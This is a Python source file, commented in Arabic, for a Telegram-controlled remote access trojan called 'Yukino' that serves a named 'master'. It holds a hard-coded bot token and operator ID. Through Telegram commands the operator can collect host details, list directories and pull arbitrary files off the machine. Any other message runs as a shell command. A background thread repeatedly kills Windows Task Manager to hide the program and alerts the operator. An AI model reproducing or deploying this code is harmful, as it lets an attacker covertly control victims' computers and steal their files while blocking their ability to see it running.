import telebot
import os
import platform
import socket
import threading
import time
import subprocess

# الإعدادات الأساسية
TOKEN = "8060120509:AAHUzbeWow9DAGR1zCAr4YjlIXSiemYWd9g"
MASTER_ID = 7706160407  # رقمك الخاص يا غالب
bot = telebot.TeleBot(TOKEN)

# --- وظيفة التحقق من الهوية ---
def is_master(message):
    return message.chat.id == MASTER_ID

# --- معلومات الجهاز ---
def get_system_info():
    try:
        return {
            "اسم الجهاز": socket.gethostname(),
            "النظام": platform.system(),
            "المستخدم": os.getlogin()
        }
    except:
        return {"خطأ": "تعذر جلب البيانات"}

# --- 1. بروتوكول الدفاع الذاتي ---
def self_defense():
    while True:
        try:
            if platform.system() == "Windows":
                output = subprocess.check_output('tasklist', shell=True).decode()
                if "taskmgr.exe" in output.lower():
                    os.system("taskkill /f /im taskmgr.exe")
                    bot.send_message(MASTER_ID, "⚠️ سيدي غالب، تم إحباط محاولة مراقبة (Task Manager)!")
        except: pass
        time.sleep(5)

# --- 2. أمر البداية والمعلومات ---
@bot.message_handler(commands=['start', 'info'])
def welcome(message):
    if is_master(message):
        info = get_system_info()
        res = f"✅ يوكينو مستعدة يا سيدي غالب!\n\n💻 الجهاز: {info['اسم الجهاز']}\n👤 المستخدم: {info['المستخدم']}\n🖥️ النظام: {info['النظام']}"
        bot.reply_to(message, res)
    else:
        bot.reply_to(message, "💭 Unauthorized input. Waiting for the key.")

# --- 3. إدارة الملفات (LS & WHEREAMI) ---
@bot.message_handler(commands=['ls'])
def list_files(message):
    if is_master(message):
        try:
            files = os.listdir(".")
            res = "📂 **قائمة الملفات:**\n\n" + "\n".join([f"📄 `{f}`" for f in files])
            bot.reply_to(message, res, parse_mode="Markdown")
        except Exception as e: bot.reply_to(message, str(e))

@bot.message_handler(commands=['whereami'])
def current_path(message):
    if is_master(message):
        bot.reply_to(message, f"📍 المسار الحالي: `{os.getcwd()}`", parse_mode="Markdown")

# --- 4. أمر سحب الملفات (Download) ---
@bot.message_handler(commands=['download'])
def send_file(message):
    if is_master(message):
        try:
            file_name = message.text.split(maxsplit=1)[1]
            if os.path.exists(file_name):
                with open(file_name, 'rb') as f:
                    bot.send_document(MASTER_ID, f)
            else: bot.reply_to(message, "❌ الملف غير موجود.")
        except: bot.reply_to(message, "📝 استخدم: /download اسم_الملف")

# --- 5. تنفيذ أوامر Terminal مباشرة ---
@bot.message_handler(func=lambda m: True)
def execute_shell(message):
    if is_master(message):
        try:
            cmd = message.text
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
            bot.reply_to(message, f"🖥️ **النتيجة:**\n`{output if output else 'تم التنفيذ بنجاح'}`", parse_mode="Markdown")
        except Exception as e:
            bot.reply_to(message, f"❌ خطأ:\n`{str(e)}`", parse_mode="Markdown")

# --- تشغيل العمليات في الخلفية ---
threading.Thread(target=self_defense, daemon=True).start()

print("Yukino is online for Master Ghalib...")
bot.infinity_polling()
